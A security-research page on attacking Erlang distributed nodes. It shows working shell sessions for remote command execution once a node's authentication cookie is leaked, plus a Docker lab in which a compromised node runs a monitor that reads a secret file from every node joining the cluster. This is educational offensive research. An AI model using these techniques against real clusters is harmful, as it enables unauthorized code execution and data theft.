# Erlang

## Authentication Cookies

Authentication between Erlang nodes is rather unique to anything I've seen elsewhere, and it all happens through the magic of cookies. The [documentation ](http://erlang.org/doc/reference_manual/distributed.html)sums this up well:

> Authentication determines which nodes are allowed to communicate with each other. In a network of different Erlang nodes, it is built into the system at the lowest possible level. Each node has its own magic cookie, which is an Erlang atom.
>
> When a node tries to connect to another node, the magic cookies are compared. If they do not match, the connected node rejects the connection.

If the authentication cookie is leaked then theoretically we can abuse the nature of Erlang's inter-connectivity to achieve command execution on a node we shouldn't necessarily be able to. Due to the distributed nature of Erlang also, this represents a fundamental risk.

Of course this only assumes you can leak the cookie. There are a number of methods, such as in the event of a lower privileged user seeing the -setcookie flag in a process list, a weak cookie or a simple brute-force. The topic of brute-forcing is discussed by Daniel Mende in [Erlang distribution RCE and a cookie bruteforcer](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/), as well as by Michael Santos in [Spoofing the Erlang Distribution Protocol](http://blog.listincomprehension.com/2010/03/spoofing-erlang-distribution-protocol.html).

If we have access to the cookie and can connect to a node's epmd port \(usually tcp/4369\), we can spawn our own node and achieve command execution in the following manner:

```erlang
otheruser@pc:/$ erl -sname booj -setcookie cookieval -remsh node@localhost
<me booj -setcookie cookieval -remsh node@localhost
Eshell V7.3 (abort with ^G)
(booj@booj)1> net_adm:ping(node@localhost).
net_adm:ping(node@localhost).
pong
(booj@booj)2> spawn(node@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end).
spawn(node@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end).
"uid=1000(mainuser) gid=1000(mainuser) groups=1000(mainuser)\n"
<6881.23434.8>
```

**References**

[https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://legacy.gitbook.com/book/reboare/booj-security/edit#)  
[http://blog.listincomprehension.com/2010/03/spoofing-erlang-distribution-protocol.html](https://legacy.gitbook.com/book/reboare/booj-security/edit#)

**Further Reading**

[Who wants cookies?](https://blog.voltone.net/post/4)  
[Unauthorized Erlang](https://blog.voltone.net/post/12)

## Node Poisoning

Connecting to an Erlang cluster can potentially be dangerous. We've mentioned the dangers of arbitrary command execution on adjacent nodes, but this also extends to your workstation upon connecting to a cluster. In Alex Weber's Erlang's remsh is dangerous, we are given a method to compromise an active workstation connecting to a cluster.

If, for example, we were to take control of a single node within a cluster, not only do we have arbitrary command execution over it, but we would also be able to infect any new nodes which join the cluster automatically.

I've tested this out using three docker containers:

#### bar@bar

```erlang
root@ubuntu:/home/booj# docker run --rm -it --name bar -h bar --net example erlang:19.3 /bin/bash
root@bar:/# echo thisisbar > /tmp/secret
root@bar:/# erl -sname bar -setcookie example
Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]

Eshell V8.3.5.4 (abort with ^G)
(bar@bar)1> net_adm:ping(foo@foo).
pong
(bar@bar)2> spawn(fun Grab_keys() ->
(bar@bar)2> net_kernel:monitor_nodes(true),
(bar@bar)2> receive
(bar@bar)2> {nodeup, Node} ->
(bar@bar)2> Keys = rpc:call(Node, os, cmd, ["cat /tmp/secret"]),
(bar@bar)2> file:write_file(string:concat("/tmp/", Node), Keys)
(bar@bar)2> end,
(bar@bar)2> Grab_keys()
(bar@bar)2> end).
<0.71.0>
```

So we've set up our first node and attached our malicious monitor.

#### foo@foo

```erlang
root@ubuntu:/home/booj# docker run --rm -it --name foo -h foo --net example erlang:19.3 /bin/bash
root@foo:/# echo thisisfoo > /tmp/secret
root@foo:/# erl -sname foo -setcookie example
Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]

Eshell V8.3.5.4 (abort with ^G)
(foo@foo)1> net_adm:ping(bar@bar).
pong
```

Now we've connected to our adjacent node and if we attach a terminal to our `bar` docker container, we'll see our dumped secret within tmp.

```bash
root@bar:/tmp# ls -la
total 20
drwxrwxrwt 1 root root 4096 Apr 16 20:18 .
drwxr-xr-x 1 root root 4096 Apr 16 20:14 ..
drwxr-xr-x 2 root root 4096 Apr 10 01:39 .tmp_dir531002228620
-rw-r--r-- 1 root root 10 Apr 16 20:18 foo@foo
-rw-r--r-- 1 root root 10 Apr 16 20:15 secret
root@bar:/tmp# cat foo@foo
thisisfoo
```

Now, any nodes that connect, due to the way Erlang works, will have their secret instantly dumped:

#### baz@baz

```erlang
root@ubuntu:/home/booj# docker run --rm -it --name baz -h baz --net example erlang:19.3 /bin/bash
root@baz:/# erl -sname baz -setcookie example
Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]

Eshell V8.3.5.4 (abort with ^G)
(baz@baz)1> net_adm:ping(foo@foo).
pong
```

```bash
root@bar:/tmp# ls -la
total 24
drwxrwxrwt 1 root root 4096 Apr 16 20:23 .
drwxr-xr-x 1 root root 4096 Apr 16 20:14 ..
drwxr-xr-x 2 root root 4096 Apr 10 01:39 .tmp_dir531002228620
-rw-r--r-- 1 root root 10 Apr 16 20:23 baz@baz
-rw-r--r-- 1 root root 10 Apr 16 20:18 foo@foo
-rw-r--r-- 1 root root 10 Apr 16 20:15 secret
```

Whilst this may not be a particularly surprising result for Erlang developers, it does represent a quite frightening realization that a single node being compromised will indeed compromise the entire network. This is more making other security researchers aware that if they're attacking an Erlang node, to absolutely do it from a secure VM that has no potential to leak their personal data. A Docker container is ideal for an attack.

**References**

[Erlang's remsh is dangerous](https://www.broot.ca/erlang-remsh-is-dangerous)  
[https://stackoverflow.com/questions/45057343/connect-erlang-nodes-on-docker](https://stackoverflow.com/questions/45057343/connect-erlang-nodes-on-docker)

## Cookie Bruteforcing

The code for cookie creation lies in [lib/kernel/src/auth.erl](https://github.com/erlang/otp/blob/master/lib/kernel/src/auth.erl).

## Further Reading

[NCC Group - Erlang Security 101](https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2014/erlang_security_101_v1-0.pdf)  
[https://github.com/msantos/spoofed](https://github.com/msantos/spoofed)  
[https://www.youtube.com/watch?v=42k70Y-yTYY](https://www.youtube.com/watch?v=42k70Y-yTYY)  
[https://conference.hitb.org/hitbsecconf2017ams/materials/D2T4 - Don Bailey - Unauthorized Erlang.pdf](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T4%20-%20Don%20Bailey%20-%20Unauthorized%20Erlang.pdf)

